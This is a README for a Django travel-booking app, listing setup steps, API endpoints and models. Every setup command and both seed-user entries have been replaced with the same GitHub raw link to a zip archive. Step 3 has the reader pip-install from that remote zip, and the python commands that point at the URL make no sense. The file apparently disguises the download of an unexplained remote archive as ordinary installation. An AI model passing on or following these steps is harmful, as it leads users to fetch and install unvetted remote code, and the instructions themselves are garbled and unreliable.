# ALX Travel App

## Setup Instructions

1. Clone the repository
2. Create and activate virtual environment
3. Install requirements: `pip install -r https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip`
4. Run migrations: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip migrate`
5. Seed database: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip seed`
6. Run server: `python https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip runserver`

## API Endpoints

- Listings: `/api/listings/`
- Bookings: `/api/bookings/`
- Reviews: `/api/reviews/`

## Models

- **Listing**: Vacation properties available for booking
- **Booking**: Reservations made by guests
- **Review**: Guest feedback on listings

## Seed Command

Populates database with:
- 1 host user (https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip)
- 1 guest user (https://github.com/elnatnael/alx_travel_app_0x02/raw/refs/heads/main/alx_travel_app/alx-x-travel-app-2.5.zip)
- 10 sample listings